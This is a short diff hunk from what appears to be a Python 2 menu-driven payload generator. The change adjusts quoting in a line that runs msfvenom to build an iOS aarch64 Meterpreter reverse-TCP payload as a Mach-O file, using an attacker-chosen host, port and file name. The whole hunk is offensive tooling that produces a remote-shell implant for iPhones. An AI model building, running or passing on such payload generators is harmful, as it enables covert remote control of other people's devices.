@@ -182,7 +182,7 @@ while True:
 
       name = raw_input('name payload>>')
 
-      matrix.system('msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp  -f macho  LHOST={} LPORT={}   -o/root/Desktop/''{}''.macho'.format(LHOST,LPORT,name))
+      matrix.system('msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp  -f macho  LHOST={} LPORT={}   -o/root/Desktop/{}.macho'.format(LHOST,LPORT,name))
 
      elif numper ==4:
 
